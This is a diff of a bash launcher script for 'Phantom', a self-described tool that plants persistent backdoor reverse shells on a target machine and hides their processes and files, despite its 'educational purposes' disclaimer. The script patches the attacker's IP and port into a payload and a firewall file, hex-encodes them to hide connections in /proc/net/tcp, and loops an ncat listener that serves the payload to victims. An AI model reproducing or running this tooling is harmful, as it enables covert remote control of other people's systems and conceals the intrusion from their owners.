@@ -1,7 +1,75 @@
 #!/bin/bash
 
-#change this according to the listening ncat ip and the location of the phantom script
+: 'Phantom is a tool which creates backdoor shells from a target machine to a predifined ip:port (your machine) and
+hides their pid, persisting through reboots. It also hides the files needed to perform the above.
 
+***Phantom was created for educational purposes. Stay away from illegal activities.***
+
+Copyright © 2018 Konstantinos Sarantopoulos
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+'
+
+#--check the number of arguments given--
+if [ $# -ne 3 ]; then
+cat << EOF
+Syntax:	phantom-init	ip 1st-port 2nd-port
+			ip: the attacker's ip
+			1st-port: the port that listens for connections to deliver the payload
+			2nd-port: the port that listens for the backdoor shells after delivering
+			the payload
+EOF
+	exit
+fi
+
+#--change the ip and port in payload--
+sed -i "s%ip=\".*\"%ip=\"$1\"%" payload
+sed -i "s%port=\".*\"%port=\"$3\"%" payload
+
+#--change the ip and port in hiding_script--
+#convert the ip to hex
+IFS='.' read -r -a ip_dec <<<$1
+ip_hex=()
+hex_ip=""
+for ((i=0; i < ${#ip_dec[@]}; i++)); do
+	if [ ${ip_dec[$i]} -gt 15 ]; then
+		ip_hex[${#ip_dec[@]}-$i]=$(printf "%x" ${ip_dec[$i]})
+	else
+		ip_hex[${#ip_dec[@]}-$i]=$(printf "0%x" ${ip_dec[$i]})
+	fi
+done
+for i in ${ip_hex[@]}; do
+	hex_ip+=$i
+done
+#convert all letters to upper (needed for /proc/net/tcp)
+hex_ip=$(echo $hex_ip | tr [:lower:] [:upper:])
+#convert the port to hex
+hex_port=$(printf "%x" $3)
+#convert all letters to upper (needed for /proc/net/tcp)
+hex_port=$(echo $hex_port | tr [:lower:] [:upper:])
+#replace the ip:port in services
+sed -i "s%~ /.*:.*/%~ /$hex_ip:$hex_port/%" payload
+
+#--change the ip and port in phantom-firewall---
+sed -i "s%~ /.*:.*/%~ /$1:$3/%" phantom-firewall
+
+#start ncat and invoke the phantom script when a connection occurs
 while true; do
-	ncat -v -l -p 8888 </home/$USER/Desktop/phantom	
+	ncat -v -l -p $2 <payload
 done
